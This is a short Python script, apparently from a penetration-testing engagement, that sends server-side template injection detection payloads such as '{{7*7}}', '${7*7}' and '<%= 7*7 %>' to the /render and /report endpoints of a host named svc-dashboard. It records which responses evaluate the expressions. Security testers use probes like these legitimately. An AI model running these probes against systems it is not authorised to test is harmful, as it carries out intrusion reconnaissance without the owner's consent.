#!/usr/bin/env python3
# INT-r27-0019 SSTI matrix probe: svc-dashboard:8006 /render + /report
# endpoints x params x payload shapes. interval >= 0.25s
import http.client, json, time, urllib.parse

HOST, PORT = "svc-dashboard", 8006
ENDPOINTS = ["/render", "/report"]
PARAMS = ["tpl", "template", "name"]
PAYLOADS = [
    ("plain",   "hello-r27"),
    ("jinja",   "{{7*7}}"),
    ("dollar",  "${7*7}"),
    ("hash",    "#{7*7}"),
    ("erb",     "<%= 7*7 %>"),
    ("brace",   "{7*7}"),
    ("jinja2",  "{{7*'7'}}"),
]

def raw_request(path):
    return "GET %s HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n" % path

def get(path):
    c = http.client.HTTPConnection(HOST, PORT, timeout=6)
    try:
        c.request("GET", path)
        r = c.getresponse()
        body = r.read().decode("utf-8", "replace")
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        return r.status, hdrs, body
    finally:
        c.close()

results = []
hits = []

for ep in ENDPOINTS:
    st, hd, bd = get(ep)
    results.append({"case": "no_param:%s" % ep, "path": ep,
                    "raw_request": raw_request(ep), "status": st,
                    "headers": hd, "body": bd[:600], "body_len": len(bd)})
    time.sleep(0.3)
    for p in PARAMS:
        for name, val in PAYLOADS:
            v = urllib.parse.quote(val, safe="")
            path = "%s?%s=%s" % (ep, p, v)
            st, hd, bd = get(path)
            ev49 = "49" in bd
            ev7777777 = "7777777" in bd
            rec = {"case": "%s:%s:%s" % (ep, p, name), "payload": val,
                   "path": path, "raw_request": raw_request(path),
                   "status": st, "headers": hd, "body": bd[:600],
                   "body_len": len(bd), "eval_49": ev49,
                   "eval_7777777": ev7777777}
            results.append(rec)
            if ev49 or ev7777777:
                hits.append(rec["case"])
            time.sleep(0.3)

print(json.dumps({"target": "svc-dashboard:8006", "intent": "INT-r27-0019",
                  "total_requests": len(results), "hits": hits,
                  "results": results}, ensure_ascii=False, indent=1))
